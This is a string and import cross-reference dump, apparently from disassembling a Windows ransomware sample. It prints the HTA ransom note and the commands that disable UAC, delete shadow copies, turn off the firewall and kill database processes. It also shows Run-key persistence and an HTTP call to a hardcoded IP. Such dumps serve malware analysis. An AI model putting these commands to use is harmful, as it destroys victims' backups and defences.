reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x404014	0x4d4b54	string	0x403ff0	boost::lock_error
0x404067	0x47340b	string	0x403ff0	;\r$1O
0x4040e7	0x47340b	string	0x404070	;\r$1O
0x404134	0x4d4b68	string	0x404110	boost::thread_resource_error
0x404187	0x47340b	string	0x404110	;\r$1O
0x4041b4	0x4d4b88	string	0x404190	boost thread: trying joining itself
0x404207	0x47340b	string	0x404190	;\r$1O
0x404228	0x4c0088	import	0x404220	KERNEL32.dll.ReleaseSemaphore
0x404258	0x4c0044	import	0x404250	KERNEL32.dll.GetProcessHeap
0x40425f	0x4c0090	import	0x404250	KERNEL32.dll.HeapFree
0x404324	0x4c0058	import	0x4042f0	KERNEL32.dll.CreateEventA
0x40433f	0x4c003c	import	0x4042f0	KERNEL32.dll.CloseHandle
0x4043e0	0x4c0054	import	0x404380	KERNEL32.dll.CreateSemaphoreA
0x4044f8	0x4c0044	import	0x404490	KERNEL32.dll.GetProcessHeap
0x4044ff	0x4c0090	import	0x404490	KERNEL32.dll.HeapFree
0x404523	0x4c003c	import	0x404490	KERNEL32.dll.CloseHandle
0x404633	0x4c0038	import	0x404580	KERNEL32.dll.WaitForSingleObjectEx
0x404729	0x4c0088	import	0x404580	KERNEL32.dll.ReleaseSemaphore
0x404742	0x47340b	string	0x404580	;\r$1O
0x404e00	0x47340b	string	0x404c10	;\r$1O
0x4050d2	0x4d4c1c	string	0x4050a0	NameValuePairs: type mismatch for '
0x4050f2	0x4d4c10	string	0x4050a0	', stored '
0x405183	0x4d4bf8	string	0x4050a0	', trying to retrieve '
0x4056e5	0x4d4c40	string	0x4056c0	Clone() is not implemented yet.
0x4057bc	0x4d4c60	string	0x4057b0	unknown
0x405895	0x4d4c6c	string	0x405860	: this object doesn't support resynchronization
0x405925	0x4d4ca0	string	0x405900	StreamTransformation: this object doesn't support random access
0x405ac5	0x4d4ce0	string	0x405aa0	RandomNumberGenerator: IncorporateEntropy not implemented
0x405b75	0x4d4d1c	string	0x405b50	BufferedTransformation: this object is not attachable
0x405c54	0x405c67	string	0x405c20	hTMM
0x405cc5	0x4d4d88	string	0x405ca0	CryptoMaterial: this object does not support precomputation
0x405e45	0x4d4dc8	string	0x405e20	GeneratableCryptoMaterial: this object does not support key/parameter generation
0x405fcb	0x4d4e28	string	0x405f80	AlgorithmParametersBase: parameter "
0x406027	0x4d4e1c	string	0x405f80	" not used
0x40674a	0x4d4e50	string	0x406690	InputBuffer
0x4067ec	0x4d4e50	string	0x406690	InputBuffer
0x406b2f	0x406b42	string	0x406b00	h0OM
0x406b42	0x4d4f30	string	0x406b00	CipherModeBase: feedback size cannot be specified for this cipher mode
0x406ca8	0x4d4f7c	string	0x406c70	/GCM
0x407016	0x4d4e88	string	0x407010	EncodingParameters
0x407316	0x4d4f94	string	0x407290	empty
0x40736a	0x47340b	string	0x407290	;\r$1O
0x407481	0x4c0018	import	0x407430	KERNEL32.dll.SetErrorMode
0x4080a7	0x47340b	string	0x407430	;\r$1O
0x408701	0x4c0018	import	0x4086b0	KERNEL32.dll.SetErrorMode
0x409402	0x47340b	string	0x4086b0	;\r$1O
0x409481	0x4c0018	import	0x409430	KERNEL32.dll.SetErrorMode
0x40a0a7	0x47340b	string	0x409430	;\r$1O
0x40a2ef	0x4c0094	import	0x40a290	KERNEL32.dll.FindFirstFileW
0x40a404	0x4c008c	import	0x40a290	KERNEL32.dll.FindNextFileW
0x40a549	0x47340b	string	0x40a290	;\r$1O
0x40a62e	0x4d500c	string	0x40a560	[ID=
0x40a67d	0x4d5018	string	0x40a560	\Users\All Users\Microsoft\Windows\Caches
0x40a6c3	0x40a6f2	string	0x40a560	hlPM
0x40a6d7	0x40a6f2	string	0x40a560	hlPM
0x40a6f2	0x4d506c	string	0x40a560	\Documents and Settings
0x40a76a	0x4d509c	string	0x40a560	\ProgramData
0x40a7e3	0x4d50b8	string	0x40a560	\Recovery
0x40a863	0x4d50cc	string	0x40a560	\ProgramData\Microsoft
0x40a8e3	0x4d50fc	string	0x40a560	\Windows
0x40a92c	0x40a963	string	0x40a560	hdQM
0x40a947	0x40a963	string	0x40a560	hdQM
0x40a963	0x4d5164	string	0x40a560	\Documents and Settings\
0x40a9ed	0x4d5110	string	0x40a560	\Local Settings\Temporary Internet Files
0x40aa71	0x40aaa3	string	0x40a560	hdQM
0x40aa87	0x40aaa3	string	0x40a560	hdQM
0x40aaa3	0x4d5164	string	0x40a560	\Documents and Settings\
0x40abe3	0x4d51b8	string	0x40a560	\Documents and Settings\All Users\Start Menu
0x40ac63	0x4d5214	string	0x40a560	\WINDOWS
0x40acae	0x40ace3	string	0x40a560	h(RM
0x40acc7	0x40ace3	string	0x40a560	h(RM
0x40ace3	0x4d5228	string	0x40a560	\Boot
0x40ad2e	0x40ad63	string	0x40a560	h4RM
0x40ad47	0x40ad63	string	0x40a560	h4RM
0x40ad63	0x4d5234	string	0x40a560	\$RECYCLE.BIN
0x40ade0	0x4d5250	string	0x40a560	\System Volume Information
0x40b76b	0x40b760	string	0x40a560	f90t
0x40b7dc	0x4d5290	string	0x40a560	io.sys
0x40b827	0x4d52a0	string	0x40a560	ntdetect.com
0x40b877	0x4d52bc	string	0x40a560	ntldr
0x40b8c7	0x4d52c8	string	0x40a560	RCRU_64.exe
0x40b917	0x4d52e0	string	0x40a560	bootfont.bin
0x40b967	0x4d52fc	string	0x40a560	Read_Me!_.txt
0x40b9b7	0x4d5318	string	0x40a560	Desktopini.exe
0x40ba07	0x4d5338	string	0x40a560	bootmgr
0x40ba57	0x4d5348	string	0x40a560	Pagesfilo.sys
0x40baa7	0x4d5364	string	0x40a560	explorer.exe
0x40baf7	0x4d5380	string	0x40a560	desktop.ini
0x40bb47	0x4d5398	string	0x40a560	BOOTSECT.BAK
0x40bb97	0x4d53b4	string	0x40a560	boot.ini
0x40c8ea	0x47340b	string	0x40a560	;\r$1O
0x40c953	0x4d54a0	string	0x40c910	Address:
0x40ca42	0x47340b	string	0x40c910	;\r$1O
0x40cd5d	0x4d54bc	string	0x40ca60	d7j3
0x40cd70	0x4d54b4	string	0x40ca60	y9a0
0x40cdd8	0x4d54ac	string	0x40ca60	m5ha
0x40d148	0x4d54c4	string	0x40ca60	udij=
0x40d46e	0x40d49a	string	0x40ca60	h\fPM
0x40d49a	0x4d500c	string	0x40ca60	[ID=
0x40dc3d	0x47340b	string	0x40ca60	;\r$1O
0x40e162	0x4c0018	import	0x40e130	KERNEL32.dll.SetErrorMode
0x40e263	0x4da378	string	0x40e130	<!DOCTYPE html><html><head><title>
0x40e27b	0x4d6148	string	0x40e130	</title><meta content='IE=edge' charset='ISO-8859-1'><HTA:APPLICATION ICON='msiexec.exe' SINGLEINSTANCE='yes' SysMenu='no'><script language='javascript'>window.moveTo(100, 100);window.resizeTo((window.screen.width)-200,(window.screen.height)-200);</script></head><style>.sal{font-size:19px;}.colo{border-radius:25px;color: black;background-color:#eaeceb;padding: 20px;white-space: pre-line;LINE-HEIGHT:20px;}.sel{color:black;background-color:#c4cac6;padding:40px;word-wrap:break-word;margin-bottom:50px;margin-top:60px;border-radius: 25px;LINE-HEIGHT:20px;}.img-container {text-align: center;}</style><body style='background-color:white;'><div class='img-container'><img src='data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4QAiRXhpZgAATU0AKgAAAAgAAQESAAMAAAABAAEAAAAAAAD/4Qm+aHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pg0KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNC40LjAtRXhpdjIiPg0KCTxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+DQoJCTxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+DQoJCQk8ZGM6Y3JlYXRvcj4NCgkJCQk8cmRmOlNlcT4NCgkJCQkJPHJkZjpsaT5WZWN0b3JTdG9jay5jb20vMTE0NDE0NDc8L3JkZjpsaT4NCgkJCQk8L3JkZjpTZXE+DQoJCQk8L2RjOmNyZWF0b3I+DQoJCTwvcmRmOkRlc2NyaXB0aW9uPg0KCTwvcmRmOlJERj4NCjwveDp4bXBtZXRhPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC
0x40e335	0x4d6108	string	0x40e130	</br></br>Your Personal ID :
0x40e3f0	0x4d6038	string	0x40e130	</br></br>Sent E-mail Should Be Contains Your Personal ID.If Don't Get a Response Or Any Other Problem
0x40e4ae	0x4d5618	string	0x40e130	<div class=sel><li style='font-size:16px;'><u><b>What Guarantee Do We Give You ?</b></u></li><br><br><br><ul><div class=sal>You Can Send Some Files For Decryption Test( Before Paying ). File Size Must Be Less Than 2MB And Files Should Not Contains Valuabe Data Like (Backups , Databases etc ... ) .</div></ul><br><hr><br><b><li style='font-size:16px;'><u>How To Buy Bitcoins</u></li></b><br><br><br><ul><div class=sal>Get Buy Bitcoin Instructions At LocalBitcoins : <br><br><a href='https://localbitcoins.com/guides/how-to-buy-bitcoins'>https://localbitcoins.com/guides/how-to-buy-bitcoins</a><br><br>Buy Bitcoin Instructions At Coindesk And Other Websites By Searching At Google :<br><br><a href='http://www.coindesk.com/information/how-can-i-buy-bitcoins/'>http://www.coindesk.com/information/how-can-i-buy-bitcoins/</a></div></ul><br><hr><br><u><li style='font-size:16px;'><b>Attention !!</b></li></u><ul><br><div class=sal><li>Do Not Edit Or Rename Encrypted Files.</li><br><br><li>Do Not Try To Decrypt Files By Third-Party Or Data Recovery Softwares It May Damage Files Forever.</li><br><br><li>In Case Of Trying To Decrypt Files With Third-Party,Recovery Sofwares This May Make The Decryption Harder So Prices Will Be Rise.</div><br></li></ul><br><br><hr><br></div></div></body></html>
0x40e7b2	0x4da458	string	0x40e130	C:\Users\
0x40e7c7	0x4da3c0	string	0x40e130	\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Read-Me.hta
0x40e94b	0x4da458	string	0x40e130	C:\Users\
0x40e960	0x4da46c	string	0x40e130	\Desktop\ReadMe_Now!.hta
0x40ea85	0x4c0250	import	0x40e130	SHELL32.dll.ShellExecuteW
0x40eaa1	0x4da4a0	string	0x40e130	C:\Documents and Settings\
0x40eab6	0x4da46c	string	0x40e130	\Desktop\ReadMe_Now!.hta
0x40ebd9	0x4da4a0	string	0x40e130	C:\Documents and Settings\
0x40ebee	0x4da4d8	string	0x40e130	\Start Menu\Programs\Startup\ReadMe_Now!.hta
0x40ee89	0x47340b	string	0x40e130	;\r$1O
0x40f150	0x4c0050	import	0x40f110	KERNEL32.dll.GetConsoleWindow
0x40f159	0x4c0258	import	0x40f110	USER32.dll.ShowWindow
0x40f161	0x4c0018	import	0x40f110	KERNEL32.dll.SetErrorMode
0x40f48b	0x4da538	string	0x40f110	hay6sj33lgmv
0x40f519	0x4da548	string	0x40f110	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f&vssadmin.exe Delete Shadows /All /Quiet&wmic shadowcopy delete&netsh advfirewall set currentprofile state off&netsh firewall set opmode mode=disable&netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
0x40f5a0	0x4da698	string	0x40f110	taskkill /im notepad.exe&taskkill /im msftesql.exe&taskkill /im sqlagent.exe&taskkill /im sqlbrowser.exe&taskkill /im sqlservr.exe&taskkill /im sqlwriter.exe&taskkill /im oracle.exe&taskkill /im ocssd.exe&taskkill /im dbsnmp.exe&taskkill /im synctime.exe&taskkill /im agntsvc.exe&taskkill /im mydesktopqos.exe&taskkill /im isqlplussvc.exe&taskkill /im xfssvccon.exe&taskkill /im mydesktopservice.exe&taskkill /im ocautoupds.exe&taskkill /im agntsvc.exe&taskkill /im encsvc.exe&taskkill /im firefoxconfig.exe&taskkill /im tbirdconfig.exe&taskkill /im ocomm.exe&taskkill /im mysqld.exe&taskkill /im mysqld-nt.exe&taskkill /im mysqld-opt.exe&taskkill /im dbeng50.exe&taskkill /im sqbcoreservice.exe&taskkill /im excel.exe&taskkill /im infopath.exe&taskkill /im msaccess.exe&taskkill /im mspub.exe&taskkill /im onenote.exe&taskkill /im outlook.exe&taskkill /im powerpnt.exe&taskkill /im steam.exe&taskkill /im thebat.exe&taskkill /im thebat64.exe&taskkill /im thunderbird.exe&taskkill /im visio.exe&taskkill /im winword.exe&taskkill /im wordpad.exe
0x40f5e3	0x4c000c	import	0x40f110	ADVAPI32.dll.GetUserNameW
0x40f6b1	0x4c004c	import	0x40f110	KERNEL32.dll.GetModuleFileNameW
0x40f712	0x4c0028	import	0x40f110	KERNEL32.dll.GetSystemDirectoryW
0x40f813	0x4dab4c	string	0x40f110	:\Users\
0x40f8be	0x4daab0	string	0x40f110	\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Desktopini.exe
0x40f9b5	0x4c0048	import	0x40f110	KERNEL32.dll.CopyFileW
0x40fa3b	0x4dab60	string	0x40f110	\Start Menu\Programs\Startup\Desktopini.exe
0x40fb40	0x4da458	string	0x40f110	C:\Users\
0x40fdd1	0x4da458	string	0x40f110	C:\Users\
0x40fdf4	0x4c0024	import	0x40f110	KERNEL32.dll.GetFileAttributesW
0x40fdff	0x4c009c	import	0x40f110	KERNEL32.dll.CreateDirectoryW
0x40fe07	0x4da458	string	0x40f110	C:\Users\
0x40fe14	0x4da458	string	0x40f110	C:\Users\
0x40fe48	0x4c0024	import	0x40f110	KERNEL32.dll.GetFileAttributesW
0x40fe56	0x4c009c	import	0x40f110	KERNEL32.dll.CreateDirectoryW
0x40fe62	0x4c009c	import	0x40f110	KERNEL32.dll.CreateDirectoryW
0x40fe71	0x4c009c	import	0x40f110	KERNEL32.dll.CreateDirectoryW
0x40fe78	0x4c0024	import	0x40f110	KERNEL32.dll.GetFileAttributesW
0x40fe8e	0x4da458	string	0x40f110	C:\Users\
0x40fea4	0x4dac04	string	0x40f110	\AppData\Pagesfilo.sys
0x4100b1	0x4dac34	string	0x40f110	n7t0
0x4100e8	0x4dac3c	string	0x40f110	p2h6
0x41032b	0x4dac3c	string	0x40f110	p2h6
0x41037a	0x4dac84	string	0x40f110	u4g8
0x410493	0x4dac84	string	0x40f110	u4g8
0x4104b7	0x4dac8c	string	0x40f110	h2gq
0x410e21	0x4dac34	string	0x40f110	n7t0
0x410e34	0x4dac3c	string	0x40f110	p2h6
0x410ee9	0x4dac84	string	0x40f110	u4g8
0x410f22	0x4dac8c	string	0x40f110	h2gq
0x41108b	0x4c0034	import	0x40f110	KERNEL32.dll.GetDiskFreeSpaceExW
0x41110d	0x4744f0	string	0x40f110	WVS3
0x41111b	0x4744f0	string	0x40f110	WVS3
0x411184	0x4dac94	string	0x40f110	echo %date%-%time%
0x4111cd	0x4dacac	string	0x40f110	nslookup myip.opendns.com. resolver1.opendns.com
0x411320	0x4dace0	string	0x40f110	,data:
0x4113db	0x4dacf0	string	0x40f110	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEA7j2OAfPG4Ko8XQQGeWjQYEq2x50Q4DBC6ZiSPQHMvN/emoPIQFceYs5Ekk8BusXEkB1mp9er3kOuGhh4dEdYKBfq+jT8uhlrK+Nk8Ed6PMj8HVqnF8fN4kIdlZt89j0qQZ/sngON+4bh8hKCqi8Y0TAZs/UO3ACscq/jHXhckfLkZqQx+8iBq3h/VOL2SAa9YaG2/EXF/5XITWawPcAynoucQCNzOPAsiWlrpa/hm1Cyp49J1MCuFeG1MYaQx+snnTBvmf9ipvPpwJJezKNYdkv/PP5jwdrHsFzusvcx/O2VND7ngOAmFpcQNXESweyESWlCS2Swp1TQbiRm/ZgV8QIBEQ==
0x411425	0x4dae7c	string	0x40f110	122.53.179.200
0x411444	0x4daea0	string	0x40f110	GET /
0x411457	0x4dae8c	string	0x40f110	HTTP/1.1\r\nHost:
0x41148b	0x4d4ff4	string	0x40f110	\r\nConnection: close\r\n\r\n
0x4114f1	0x4c0268	import	0x40f110	WS2_32.dll.WSAStartup
0x411513	0x4c0274	import	0x40f110	WS2_32.dll.socket
0x411527	0x4c026c	import	0x40f110	WS2_32.dll.gethostbyname
0x411534	0x4c0264	import	0x40f110	WS2_32.dll.htons
0x411581	0x4c0260	import	0x40f110	WS2_32.dll.send
0x411591	0x4c027c	import	0x40f110	WS2_32.dll.connect
0x41161b	0x4dac3c	string	0x40f110	p2h6
0x411670	0x4dac34	string	0x40f110	n7t0
0x411683	0x4dac3c	string	0x40f110	p2h6
0x41176c	0x4c0278	import	0x40f110	WS2_32.dll.closesocket
0x411772	0x4c0270	import	0x40f110	WS2_32.dll.WSACleanup
0x4118b6	0x47340b	string	0x40f110	;\r$1O
0x411b26	0x4c0018	import	0x411ae0	KERNEL32.dll.SetErrorMode
0x411be0	0x4c002c	import	0x411ae0	KERNEL32.dll.MultiByteToWideChar
0x411bfd	0x4c0034	import	0x411ae0	KERNEL32.dll.GetDiskFreeSpaceExW
0x411c04	0x4c0060	import	0x411ae0	KERNEL32.dll.GetDriveTypeW
0x411d2d	0x4c0094	import	0x411ae0	KERNEL32.dll.FindFirstFileW
0x411d65	0x4daeb4	string	0x411ae0	\Read_Me!_.txt
0x411e1b	0x4daeb4	string	0x411ae0	\Read_Me!_.txt
0x411e99	0x4daef8	string	0x411ae0	Your Data Locked.\r\nTo Get Decryption Instructions Email Us ,Don't Edit File Or Folders ! \r\nID :
0x411ebf	0x4daed4	string	0x411ae0	\r\nEmail Address :
0x41223b	0x4c008c	import	0x411ae0	KERNEL32.dll.FindNextFileW
0x412261	0x4d5018	string	0x411ae0	\Users\All Users\Microsoft\Windows\Caches
0x4122b5	0x4122e4	string	0x411ae0	hlPM
0x4122c8	0x4122e4	string	0x411ae0	hlPM
0x4122e4	0x4d506c	string	0x411ae0	\Documents and Settings
0x412366	0x4d509c	string	0x411ae0	\ProgramData
0x4123e8	0x4d50b8	string	0x411ae0	\Recovery
0x41246a	0x4d50cc	string	0x411ae0	\ProgramData\Microsoft
0x4124f3	0x4d50fc	string	0x411ae0	\Windows
0x41254c	0x412583	string	0x411ae0	hdQM
0x412567	0x412583	string	0x411ae0	hdQM
0x412583	0x4d5164	string	0x411ae0	\Documents and Settings\
0x412624	0x4d5110	string	0x411ae0	\Local Settings\Temporary Internet Files
0x4126b8	0x4126e7	string	0x411ae0	hdQM
0x4126cb	0x4126e7	string	0x411ae0	hdQM
0x4126e7	0x4d5164	string	0x411ae0	\Documents and Settings\
0x412853	0x4d51b8	string	0x411ae0	\Documents and Settings\All Users\Start Menu
0x4128e3	0x4d5214	string	0x411ae0	\WINDOWS
0x412940	0x412973	string	0x411ae0	h(RM
0x412957	0x412973	string	0x411ae0	h(RM
0x412973	0x4d5228	string	0x411ae0	\Boot
0x4129d0	0x412a03	string	0x411ae0	h4RM
0x4129e7	0x412a03	string	0x411ae0	h4RM
0x412a03	0x4d5234	string	0x411ae0	\$RECYCLE.BIN
0x412a60	0x412a93	string	0x411ae0	hPRM
0x412a77	0x412a93	string	0x411ae0	hPRM
0x412a93	0x4d5250	string	0x411ae0	\System Volume Information
0x41342d	0x4c0008	import	0x411ae0	ADVAPI32.dll.GetNamedSecurityInfoW
0x413498	0x4c005c	import	0x411ae0	KERNEL32.dll.lstrcmpW
0x4134c6	0x4daeb4	string	0x411ae0	\Read_Me!_.txt
0x413552	0x4dafc8	string	0x411ae0	Your Data Locked.\r\nTo Get Decryption Instructions Email Us ,Don't Edit Files Or Folders ! \r\nID :
0x41356b	0x4daed4	string	0x411ae0	\r\nEmail Address :
0x413939	0x4c004c	import	0x411ae0	KERNEL32.dll.GetModuleFileNameW
0x413987	0x4db08c	string	0x411ae0	\RCRU_64.exe
0x413a1c	0x4c0048	import	0x411ae0	KERNEL32.dll.CopyFileW
0x413a27	0x4db0a8	string	0x411ae0	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f&reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f
0x413a76	0x4db1d0	string	0x411ae0	reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Updaters /t REG_SZ /d
0x413a8a	0x4db160	string	0x411ae0	/f&reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
0x414134	0x4c0024	import	0x411ae0	KERNEL32.dll.GetFileAttributesW
0x41478c	0x4c0020	import	0x411ae0	KERNEL32.dll.FindClose
0x4147fc	0x47340b	string	0x411ae0	;\r$1O
0x4149aa	0x4c0018	import	0x414960	KERNEL32.dll.SetErrorMode
0x414a60	0x4c002c	import	0x414960	KERNEL32.dll.MultiByteToWideChar
0x414a7d	0x4c0034	import	0x414960	KERNEL32.dll.GetDiskFreeSpaceExW
0x414a84	0x4c0060	import	0x414960	KERNEL32.dll.GetDriveTypeW
0x414aae	0x4c0094	import	0x414960	KERNEL32.dll.FindFirstFileW
0x414cd5	0x4daeb4	string	0x414960	\Read_Me!_.txt
0x414d8b	0x4daeb4	string	0x414960	\Read_Me!_.txt
0x414e09	0x4dafc8	string	0x414960	Your Data Locked.\r\nTo Get Decryption Instructions Email Us ,Don't Edit Files Or Folders ! \r\nID :
0x414e2f	0x4daed4	string	0x414960	\r\nEmail Address :
0x4151ae	0x4d5018	string	0x414960	\Users\All Users\Microsoft\Windows\Caches
0x415202	0x415233	string	0x414960	hlPM
0x415217	0x415233	string	0x414960	hlPM
0x415233	0x4d506c	string	0x414960	\Documents and Settings
0x4152b5	0x4d509c	string	0x414960	\ProgramData
0x415337	0x4d50b8	string	0x414960	\Recovery
0x4153b9	0x4d50cc	string	0x414960	\ProgramData\Microsoft
0x415443	0x4d50fc	string	0x414960	\Windows
0x41549c	0x4154d3	string	0x414960	hdQM
0x4154b7	0x4154d3	string	0x414960	hdQM
0x4154d3	0x4d5164	string	0x414960	\Documents and Settings\
0x415574	0x4d5110	string	0x414960	\Local Settings\Temporary Internet Files
0x415608	0x415637	string	0x414960	hdQM
0x41561b	0x415637	string	0x414960	hdQM
0x415637	0x4d5164	string	0x414960	\Documents and Settings\
0x4157a3	0x4d51b8	string	0x414960	\Documents and Settings\All Users\Start Menu
0x415833	0x4d5214	string	0x414960	\WINDOWS
0x415890	0x4158c3	string	0x414960	h(RM
0x4158a7	0x4158c3	string	0x414960	h(RM
0x4158c3	0x4d5228	string	0x414960	\Boot
0x415920	0x415953	string	0x414960	h4RM
0x415937	0x415953	string	0x414960	h4RM
0x415953	0x4d5234	string	0x414960	\$RECYCLE.BIN
0x4159b0	0x4159e3	string	0x414960	hPRM
0x4159c7	0x4159e3	string	0x414960	hPRM
0x4159e3	0x4d5250	string	0x414960	\System Volume Information
0x4162db	0x4c008c	import	0x414960	KERNEL32.dll.FindNextFileW
0x4162ea	0x4c0020	import	0x414960	KERNEL32.dll.FindClose
0x4164ec	0x4c0008	import	0x414960	ADVAPI32.dll.GetNamedSecurityInfoW
0x416508	0x4c005c	import	0x414960	KERNEL32.dll.lstrcmpW
0x416548	0x4daeb4	string	0x414960	\Read_Me!_.txt
0x4165d4	0x4dafc8	string	0x414960	Your Data Locked.\r\nTo Get Decryption Instructions Email Us ,Don't Edit Files Or Folders ! \r\nID :
0x4165ed	0x4daed4	string	0x414960	\r\nEmail Address :
0x4169ac	0x4c004c	import	0x414960	KERNEL32.dll.GetModuleFileNameW
0x416a02	0x4db08c	string	0x414960	\RCRU_64.exe
0x416a97	0x4c0048	import	0x414960	KERNEL32.dll.CopyFileW
0x416aa2	0x4db0a8	string	0x414960	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f&reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f
0x416af1	0x4db1d0	string	0x414960	reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Updaters /t REG_SZ /d
0x416b05	0x4db160	string	0x414960	/f&reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
0x417228	0x47340b	string	0x414960	;\r$1O
0x4175a3	0x47340b	string	0x417350	;\r$1O
0x41765c	0x47340b	string	0x4175c0	;\r$1O
0x418002	0x418034	string	0x417f60	hxOM
0x418368	0x418379	string	0x418320	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41836e	0x418379	string	0x418320	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41842c	0x4d4e60	string	0x418420	SHA-1
